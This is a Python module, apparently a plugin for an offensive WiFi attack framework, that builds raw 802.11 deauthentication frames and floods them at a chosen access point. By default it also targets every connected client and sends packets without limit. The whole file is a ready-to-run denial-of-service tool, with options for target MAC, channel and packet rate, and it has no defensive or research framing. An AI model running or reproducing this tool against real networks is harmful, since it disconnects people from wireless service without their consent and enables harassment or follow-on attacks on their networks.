DESCRIPTION = "Deauthentication flood - disconnect clients from WiFi"
DATE = "2026-05-03"
RANK = "Good"
AUTHOR = "WiFiStrike"

OPTIONS = {
    "interface": {"default": "wlan1", "description": "Wireless interface in monitor mode"},
    "bssid": {"default": "", "description": "Target AP MAC address"},
    "client": {"default": "FF:FF:FF:FF:FF:FF", "description": "Target client MAC (FF:FF:FF:FF:FF:FF = all)"},
    "channel": {"default": "", "description": "Channel to attack on"},
    "count": {"default": "0", "description": "Number of packets (0 = infinite)"},
    "speed": {"default": "100", "description": "Packets per second"}
}

import socket
import struct
import time
import subprocess
import sys

def mac_to_bytes(mac):
    return bytes.fromhex(mac.replace(":", "").replace("-", ""))

def create_deauth_frame(src_mac, dst_mac, bssid_mac):
    radiotap = b'\x00\x00\x0d\x00\x00\x80\x04\x00\x02\x00\x00\x00\x00\x00'

    frame_ctrl = struct.pack('<H', 0x00C0)
    duration = b'\x00\x00'
    dst = mac_to_bytes(dst_mac)
    src = mac_to_bytes(src_mac)
    bssid = mac_to_bytes(bssid_mac)
    seq = struct.pack('<H', 0x0000)

    mac_header = frame_ctrl + duration + dst + src + bssid + seq
    reason = struct.pack('<H', 7)

    return radiotap + mac_header + reason

def set_channel(interface, channel):
    try:
        subprocess.run(["sudo", "iw", "dev", interface, "set", "channel", str(channel)],
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=2)
    except:
        pass

def run(options):
    interface = options.get("interface", "wlan1")
    bssid = options.get("bssid", "").upper()
    client = options.get("client", "FF:FF:FF:FF:FF:FF").upper()
    channel = options.get("channel", "")
    count = int(options.get("count", 0))
    speed = int(options.get("speed", 100))

    if not bssid:
        print("[!] BSSID required!")
        print("[*] Usage: set bssid:00:11:22:33:44:55")
        return

    if channel:
        set_channel(interface, channel)

    print(f"[*] Interface: {interface}")
    print(f"[*] Target AP: {bssid}")
    print(f"[*] Target Client: {client}")
    print(f"[*] Channel: {channel if channel else 'Current'}")
    print(f"[*] Speed: {speed} packets/sec")
    print(f"[*] Packets: {count if count > 0 else 'Infinite'}")
    print()
    print("[*] Starting deauth attack...")
    print("[*] Press Ctrl+C to stop")
    print()

    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
        sock.bind((interface, 0))
    except Exception as e:
        print(f"[!] Cannot open socket: {e}")
        print("[*] Enable monitor mode: sudo airmon-ng start wlan1")
        return

    frame_to_client = create_deauth_frame(bssid, client, bssid)

    if client != "FF:FF:FF:FF:FF:FF":
        frame_to_ap = create_deauth_frame(client, bssid, bssid)
    else:
        frame_to_ap = None

    delay = 1.0 / speed if speed > 0 else 0

    sent = 0
    start_time = time.time()

    try:
        i = 0
        while count == 0 or i < count:
            sock.send(frame_to_client)
            sent += 1

            if frame_to_ap:
                sock.send(frame_to_ap)
                sent += 1
                i += 2
            else:
                i += 1

            if i % 100 == 0:
                elapsed = time.time() - start_time
                pps = sent / elapsed if elapsed > 0 else 0
                sys.stdout.write(f"\r[+] Packets: {sent} | Speed: {pps:.0f} pps | Time: {elapsed:.0f}s")
                sys.stdout.flush()

            time.sleep(delay)

    except KeyboardInterrupt:
        pass

    elapsed = time.time() - start_time
    print()
    print()
    print(f"[+] Attack finished!")
    print(f"[+] Packets sent: {sent}")
    print(f"[+] Duration: {elapsed:.1f} seconds")

    sock.close()

if __name__ == "__main__":
    run({
        "interface": "wlan1",
        "bssid": "00:11:22:33:44:55",
        "client": "FF:FF:FF:FF:FF:FF",
        "channel": "6",
        "count": "100",
        "speed": "100"
    })
